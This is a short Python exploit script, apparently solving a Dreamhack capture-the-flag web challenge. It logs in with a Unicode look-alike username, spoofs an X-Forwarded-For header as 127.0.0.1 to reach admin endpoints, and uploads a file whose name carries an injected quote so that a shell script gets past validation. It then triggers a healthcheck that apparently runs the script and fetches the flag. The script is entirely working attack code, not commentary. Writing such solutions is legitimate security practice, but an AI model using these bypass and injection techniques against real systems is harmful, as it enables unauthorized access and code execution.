import requests

URL = "http://host1.dreamhack.games:20299"

login = {"username" : "\u212Aimgildong123","password" : "0p1q9o2w8i3e"}

headers = {"X-Forwarded-For" : "127.0.0.1"}

validate_param = {"path" : "malicious.sh\";dummy=.txt"}

target = {"target" : "malicious"}

session = requests.Session()

# 0. login

session.post(f"{URL}/auth/login",json=login)

# 1. Upload File

with open('./malicious.sh";dummy=.txt','rb') as f: # 리눅스에서만 가능 (Windows에서는 파일 이름에 " 포함 불가)
    upload = {'file' : f}
    res = session.post(f"{URL}/admin/upload",headers=headers,files=upload)

# 2. Validate File

validate_req = session.post(f"{URL}/admin/validate",headers=headers,json=validate_param)

# 3. Health Check

healthcheck_req = session.post(f"{URL}/admin/healthcheck",headers=headers,json=target)

# 4. get FLAG

flag = session.get(f"{URL}/uploads/client/test.txt").text

print("FLAG : " + flag)
